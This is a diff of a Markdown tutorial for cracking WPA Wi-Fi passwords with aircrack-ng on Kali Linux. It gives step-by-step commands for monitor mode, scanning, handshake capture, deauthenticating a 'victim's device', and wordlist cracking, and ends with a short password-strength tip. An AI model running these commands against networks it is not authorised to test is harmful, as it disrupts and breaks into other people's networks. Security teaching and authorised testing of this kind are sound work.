@@ -21,44 +21,55 @@ If you dont have a newtowrk card you can always buy a external one.
 
 ## Procedure
 
-### Determine the Network Interface
-Identify the wireless network interfaces, which usually start with w (e.g., wlp3s0). This information will be needed later.
-Open a terminal and type:
+### 1 - Determine the Network Interface
+
+<br>Identify the wireless network interfaces, which usually start with w (e.g., wlp3s0).
+<br>This information will be needed later.
+<br>Open a terminal and type:
 
 ```
 ip a
 ```
 
-### Enable Monitor Mode
-Use the airmon-ng tool to switch your network card to monitor mode.
-<br>This will enable monitor mode on your network card, but it will break your internet connection temporarily.
+### 2 - Enable Monitor Mode
+
+<br>Use the airmon-ng tool to switch your network card to monitor mode.
+<br>It will break your internet connection temporarily.
 <br>Enter the command:
 
 ```
 airmon-ng start <wireless interface>
 ```
 
-Replace:
-- `<wireless interface>` - name of your wireless interface (e.g., airmon-ng start wlp3s0).
+- Example: `airmon-ng start wlp3s0`
 
-### Verify Monitor Mode
+### 3 - Verify Monitor Mode
+
+<br>The wireless interface should be displayed as `<interface>mon` (e.g., wlp3s0mon).
+<br>If not, it means your network card doesn't support monitor mode, and you'll need the external network card mentioned earlier.
+<br>Run the command in a terminal to check if the network card's mode has changed to monitor.
 
 ```
 iwconfig
 ```
 
-Run the command in a terminal to check if the network card's mode has changed to monitor.
-The wireless interface should be displayed as `<interface>mon` (e.g., wlp3s0mon).
-If not, it means your network card doesn't support monitor mode, and you'll need the external network card mentioned earlier.
+### 4 - Scan for Networks
 
-### Scan for Networks
-Use airodump-ng to view the networks around you. Enter the command `airodump-ng` <wireless interface>mon (e.g., airodump-ng wlan0mon).
-This command will display a list of nearby networks along with their BSSIDs (network MAC addresses) and channels.
+<br>Use airodump-ng to view the networks around you.
+<br>This command will display a list of nearby networks along with their BSSIDs (network MAC addresses) and channels.
+<br>Enter the command:
 
-### Target Network
+```
+airodump-ng <wireless interface>mon
+```
+
+- Example: `airodump-ng wlp3s0mon`
+
+
+### 5 - Target Network
 Identify the BSSID and channel of the network you wish to attack.
 
-### Capture the Handshake
+### 6 - Capture the Handshake
 In a new terminal window, enter the command `airodump-ng --bssid <BSSID> --channel <channel> --write <filename> <wireless interface>mon`.
 <BSSID> - target network's BSSID
 <channel> - target network's channel
@@ -67,7 +78,7 @@ In a new terminal window, enter the command `airodump-ng --bssid <BSSID> --chann
 
 This command will start capturing the handshake from devices connected to the target network.
 
-### Deauthentication Attack
+### 7 - Deauthentication Attack
 To force a device to reconnect and capture the handshake, use the command aireplay-ng -0 10 -a <BSSID> -c <client ESSID> <wireless interface>mon.
 <BSSID> - target network's BSSID
 <client ESSID> - with the ESSID (name) of the device you want to deauthenticate (e.g., the victim's device)
@@ -75,12 +86,12 @@ To force a device to reconnect and capture the handshake, use the command airepl
     
 This command will send deauthentication packets to the victim's device, forcing it to disconnect and reconnect to the network.
 
-### Capture the Handshake
+### 8 - Capture the Handshake
 Observe the terminal running airodump-ng and wait for a device to reconnect.
 Once the handshake is captured, you can stop airodump-ng by pressing Ctrl+C.
 The captured handshake will be saved in the specified filename.
 
-### Word List Attack
+### 9 - Word List Attack
 Kali Linux comes with pre-installed word lists located in the directory mentioned below.
 Use the aircrack-ng command to crack the password.
 Enter aircrack-ng -w <wordlist> <filename> to start the cracking process.
@@ -89,7 +100,7 @@ Enter aircrack-ng -w <wordlist> <filename> to start the cracking process.
 
 This command will attempt to match the captured handshake with passwords from the word list.
 
-### Protecting Yourself
+## Protecting Yourself
 While you cannot prevent the authentication process, you can protect against word list attacks by choosing a long and random password that is unlikely to be found in any word list.
 
 ---
